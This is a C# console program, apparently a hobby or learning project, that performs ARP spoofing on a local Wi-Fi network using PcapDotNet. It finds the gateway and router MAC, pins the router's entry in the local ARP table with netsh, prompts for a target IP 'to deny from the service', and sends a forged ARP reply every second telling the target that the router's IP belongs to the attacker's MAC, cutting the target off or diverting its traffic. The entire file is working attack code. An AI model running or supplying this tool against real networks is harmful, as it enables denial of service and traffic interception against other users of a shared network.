using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace ARP_Spoofing
{
    class Program
    {
        private static bool keepRunning = true;

        static void Main(string[] args)
        {
            //netsh -c interface ipv4 add neighbors "Wi-Fi" "IP" "MAC"
            //netsh -c interface ipv4 delete neighbors "Wi-Fi" "IP"
            
            Console.CancelKeyPress += Console_CancelKeyPress;

            PhysicalAddress attackerMAC = null;
            IPAddress attackerIP = null;

            PhysicalAddress routerMAC = null;
            IPAddress routerGateway = null;
            IPAddress networkSubnetMask = null;

            string interfaceName = null;

            var networkInterface = NetworkInterfaceType.Wireless80211;

            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.NetworkInterfaceType == networkInterface && nic.GetIPProperties().GatewayAddresses.Count > 0)
                {
                    Console.WriteLine("Interface selected: " + nic.Name);
                    interfaceName = nic.Name;
                    attackerMAC = nic.GetPhysicalAddress();
                    routerGateway = nic.GetIPProperties().GatewayAddresses[0].Address;
                    foreach (GatewayIPAddressInformation gateway in nic.GetIPProperties().GatewayAddresses)
                    {
                        if (gateway.Address.ToString().Split('.').Length == 4)
                        {
                            routerGateway = gateway.Address;
                        }
                    }
                    foreach (UnicastIPAddressInformation UnicatIPInfo in nic.GetIPProperties().UnicastAddresses)
                    {
                        if (UnicatIPInfo.IPv4Mask.ToString() != "0.0.0.0")
                        {
                            attackerIP = UnicatIPInfo.Address;
                            networkSubnetMask = UnicatIPInfo.IPv4Mask;
                            break;
                        }
                    }
                }
            }

            Console.WriteLine();
            Console.WriteLine("Attacker's MAC Address: " + FormatMACAddress(attackerMAC, ":"));
            Console.WriteLine("Attacker's LAN IP Address: " + attackerIP.ToString());
            Console.WriteLine();
            Console.WriteLine("Router's Gateway Address: " + routerGateway.ToString());
            Console.WriteLine("LAN Subnet Mask: " + networkSubnetMask.ToString());

            if (attackerMAC == null || attackerIP == null || networkSubnetMask == null || routerGateway == null)
            {
                Console.WriteLine("One or more details can't be retrieved! Program needs to exit!");
            }
            else 
            {
                byte[] rMAC = new byte[6];
                int rlength = rMAC.Length;
                int result = SendARP(BitConverter.ToUInt32(routerGateway.GetAddressBytes(), 0), 0, rMAC, ref rlength);
                if (result == 0)
                {
                    routerMAC = new PhysicalAddress(rMAC);
                    Console.WriteLine("Router's MAC Address: " + FormatMACAddress(routerMAC, ":"));
                    Console.WriteLine();

                    RunProgram("netsh", "interface ipv4 add neighbors \"" + interfaceName + "\" \"" + routerGateway.ToString() + "\" \"" + FormatMACAddress(routerMAC, "-") + "\"");

                    Console.Write("Enter the target IP to deny from the service: ");
                    IPAddress parsedInput = null;
                    if (IPAddress.TryParse(Console.ReadLine(), out parsedInput))
                    {
                        Console.WriteLine("Sending spoofed ARP packets to " + parsedInput.ToString());
                        Console.WriteLine("Press CTRL+C to exit gracefully");
                        byte[] bTargetMAC = new byte[6];
                        int tLength = bTargetMAC.Length;
                        result = SendARP(BitConverter.ToUInt32(parsedInput.GetAddressBytes(), 0), 0, bTargetMAC, ref tLength);
                        var targetMAC = new PhysicalAddress(bTargetMAC);

                        EthernetLayer eLayer = new EthernetLayer();
                        eLayer.Source = new MacAddress(FormatMACAddress(attackerMAC, ":"));
                        eLayer.Destination = new MacAddress(FormatMACAddress(targetMAC, ":"));
                        eLayer.EtherType = EthernetType.Arp;

                        ArpLayer aLayer = new ArpLayer();
                        aLayer.ProtocolType = EthernetType.IpV4;
                        aLayer.Operation = ArpOperation.Reply;

                        aLayer.SenderHardwareAddress = new ReadOnlyCollection<byte>(attackerMAC.GetAddressBytes());
                        aLayer.SenderProtocolAddress = new ReadOnlyCollection<byte>(routerGateway.GetAddressBytes());
                        aLayer.TargetHardwareAddress = new ReadOnlyCollection<byte>(targetMAC.GetAddressBytes());
                        aLayer.TargetProtocolAddress = new ReadOnlyCollection<byte>(parsedInput.GetAddressBytes());

                        Packet spoofedPacket = new PacketBuilder(eLayer, aLayer).Build(DateTime.Now);
                        var lpDevices = LivePacketDevice.AllLocalMachine;
                        foreach (var dev in lpDevices) 
                        {
                            if (dev.Addresses[1].ToString().Contains(attackerIP.ToString())) 
                            {
                                PacketCommunicator communicator = dev.Open(65536, PacketDeviceOpenAttributes.DataTransferUdpRemote, 1000);
                                while (keepRunning) 
                                {
                                    communicator.SendPacket(spoofedPacket);
                                    Thread.Sleep(1000);
                                }
                                RunProgram("netsh", "interface ipv4 delete neighbors \"" + interfaceName + "\" \"" + routerGateway.ToString() + "\"");
                                break;
                            }
                        }
                    }
                    else
                    {
                        Console.WriteLine("Input cannot be parsed correctly!");
                    }
                }
                else 
                {
                    Console.WriteLine("Could not retrieve router's MAC address!");
                }
            }
            Console.WriteLine("Press any key to exit the program...");
            Console.ReadLine();
        }

        static void Console_CancelKeyPress(object sender, ConsoleCancelEventArgs e)
        {
            e.Cancel = true;
            keepRunning = false;
        }

        // This is a very lousy way to do it! Oh well!
        private static string FormatMACAddress(PhysicalAddress addr, string delim) 
        {
            string macAddr = addr.ToString();
            return macAddr.Substring(0, 2) + delim +
                   macAddr.Substring(2, 2) + delim +
                   macAddr.Substring(4, 2) + delim +
                   macAddr.Substring(6, 2) + delim +
                   macAddr.Substring(8, 2) + delim + 
                   macAddr.Substring(10, 2);
        }

        private static void RunProgram(string executable, string arguments) 
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo(executable, arguments);
            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;
            Process.Start(procStartInfo);
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        public static extern int SendARP(uint DestIP, uint SrcIP, byte[] pMacAddr, ref int PhyAddrLen);
    }
}
